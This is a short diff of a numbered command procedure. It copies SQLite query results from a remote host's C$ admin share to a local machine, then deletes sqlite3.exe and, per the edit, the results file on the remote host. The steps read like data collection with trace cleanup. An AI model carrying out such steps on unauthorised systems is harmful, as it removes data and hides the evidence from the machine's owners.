@@ -9,5 +9,6 @@
 9. .quit; (remote machine)
 10. xcopy.exe \\TARGET\c$\query_results.txt . (local machine - another terminal window)
 11. del sqlite3.exe (remote machine)
-12. exit (remote machine)
-13. notepad.exe (local machine)
+12. del query_results.txt (remote machine)
+13. exit (remote machine)
+14. notepad.exe query_results.txt (local machine)
